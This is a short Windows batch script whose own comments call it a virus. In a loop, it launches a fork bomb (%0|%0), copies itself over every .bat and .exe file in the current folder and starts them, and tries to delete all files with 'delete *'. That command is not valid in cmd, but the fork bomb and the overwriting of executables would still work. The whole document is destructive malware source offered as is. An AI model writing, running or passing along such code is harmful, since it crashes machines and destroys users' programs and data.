@echo off

:: change name and color
title susi baka
color 57

:: loop
lessgo:

:: increase cpu usage
%0|%0

:: copy and start all bat files
copy %0 *.bat > nul
start "" *.bat

:: copy and start all exe files
copy %0 *.exe > nul
start "" *.exe

:: virus
delete *

:: start loop
goto lessgo
